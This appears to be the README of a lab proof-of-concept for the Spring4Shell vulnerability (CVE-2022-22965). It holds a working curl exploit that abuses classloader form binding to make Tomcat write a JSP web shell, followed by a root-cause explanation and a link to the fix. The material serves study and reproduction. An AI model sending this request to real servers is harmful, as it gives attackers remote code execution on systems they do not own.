# CVE-2022-22965 PoC

Minimal example of how to reproduce CVE-2022-22965 Spring RCE.

## Run using docker compose

1. Build the application using Docker compose
    ```shell
    docker-compose up --build
    ```
2. To test the app browse to [http://localhost:8080/spring4shell/greeting](http://localhost:8080/spring4shell/greeting)
3. Run the exploit
    ```shell
    ./exploits/run.sh
    ```
4. The exploit is going to create `rce.jsp` file in  `webapps/spring4shell` on the web server.
5.  Use the exploit
Browse to [http://localhost:8080/spring4shell/rce.jsp](http://localhost:8080/spring4shell/rce.jsp)


## Alternative way (debug oriented)

1. Run the Tomcat server in docker
    ```shell
    docker run -p 8888:8080 --rm --interactive --tty --name vm1 tomcat:9.0
    ```
    _Add `-p 5005:5005 -e "JAVA_OPTS=-Xdebug -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"` if you want to debug remotely._
2. Build the project
    ```shell
    ./mvnw install
    ```
3. Deploy the app
    ```shell
    docker cp target/handling-form-submission-complete.war vm1:/usr/local/tomcat/webapps
    ```
4. Write the exploit
    ```shell
    curl -X POST \
      -H "pre:<%" \
      -H "post:;%>" \
      -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \
      -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
      -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/handling-form-submission-complete' \
      -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
      -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
      http://localhost:8888/handling-form-submission-complete/greeting
    ```
    The exploit is going to create `rce.jsp` file in  `webapps/handling-form-submission-complete` on the web server.

5. Use the exploit
    ```shell
    curl http://localhost:8080/rce.jsp
    ```
    Now you'll see `123` in the container's terminal. Replace `System.out.println(123)` with your payload to execute arbitrary code.

## Short technical explanation

1. Spring knows how to bind form fields to Java object. In our example `GreetingController` handle POST requests on `/greeting` endpoint and binds form fields to the `Greeting` object.
2. It also supports binding of nested fields (e.g. `user.info.firstname`). See the [AbstractNestablePropertyAccessor](https://github.com/spring-projects/spring-framework/blob/8baf404893037951ac29393a41d40af4fa11775b/spring-beans/src/main/java/org/springframework/beans/AbstractNestablePropertyAccessor.java#L622) for references.
3. In our example `Greeting` class has two fields `id` and `content`, but actually it also has a reference to the Class object. We can use `class.module.classLoader` as a form data key to access the classloader.
4. In the [fix](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15) we can see that the main change was to restrict access to most of the Class object properties, including the `module` one.
5. This behaviour allows us to set public properties of classes accessible via nested reference chain from the `Greeting` class. Nothing else. In most of the cases it is not even dangerous because no classes with public fields are available even from `class.module.classLoader.`.
6. It becomes a problem on the Tomcat server because the classloader there has [`getResources` accessor](https://tomcat.apache.org/tomcat-8.0-doc/api/org/apache/catalina/loader/WebappClassLoaderBase.html#getResources()) which allows us to continue the reference chain and access one of the instances of [the `AccessLogValve` class](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/valves/AccessLogValve.html).
7. This class is meant to write logs. We change some properties to make it write files with the name and content of our choice. We have arbitrary file write at this point.
8. We create `jsp` file with in the root of the application folder with the malicious payload. As far as `jsp` are automatically executed by the Tomcat we can navigate to it in the browser and eventually execute the payload. Now it is RCE.

## Conditions

The exploit works only on Tomcat because it has special classloader. Although the similar reference chain may exist on other web application servers as well. It is not simply discovered yet.

The exploit requires Java 9 or above because `module` property was added in Java 9.

## References

- The server part is based on the https://gist.github.com/esell/c9731a7e2c5404af7716a6810dc33e1a step-by-step manual.
- The exploit part is based on https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py script.
- Snyk advisory about the vulnerability is available here: https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751 
